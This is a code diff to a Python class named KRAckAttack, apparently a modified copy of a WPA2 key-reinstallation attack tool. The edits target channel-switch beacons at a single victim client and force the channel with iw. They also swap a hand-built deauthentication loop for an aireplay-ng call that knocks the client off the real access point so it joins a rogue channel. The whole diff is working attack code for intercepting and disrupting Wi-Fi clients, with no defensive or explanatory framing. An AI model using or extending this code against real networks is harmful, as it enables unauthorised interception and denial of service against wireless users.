@@ -276,10 +276,6 @@ class KRAckAttack():
 		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
 		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))
 
-	def try_channel_switch(self, macaddr):
-		self.send_csa_beacon()
-		self.queue_disas(macaddr)
-
 	def hostapd_add_allzero_client(self, client):
 		if client.assocreq is None:
 			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
@@ -399,7 +395,6 @@ class KRAckAttack():
 				if p.addr2 in self.clients: del self.clients[p.addr2]
 				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
 				self.send_csa_beacon(target=p.addr2)
-				self.send_csa_beacon()
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].update_state(ClientState.Connecting)
 
@@ -621,16 +616,16 @@ class KRAckAttack():
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
-		self.send_csa_beacon(numbeacons=4)
+		self.send_csa_beacon(target=self.clientmac, numbeacons=4)
 
-		# subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
+		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		for i in range(0, 11):
-			dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
-			deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
-			self.sock_real.send(deauth)
-		# subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
+		# for i in range(0, 11):
+		# 	dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
+		# 	deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
+		# 	self.sock_real.send(deauth)
+		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
 		if self.clientmac:
@@ -656,8 +651,9 @@ class KRAckAttack():
 				self.send_disas(self.disas_queue.pop()[1])
 
 			if self.continuous_csa and nextbeacon <= time.time():
-				self.send_csa_beacon(silent=True)
+				self.send_csa_beacon(target=self.clientmac)
 				nextbeacon += 0.10
+				subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 			if self.last_real_beacon + 2 < time.time():
 				log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
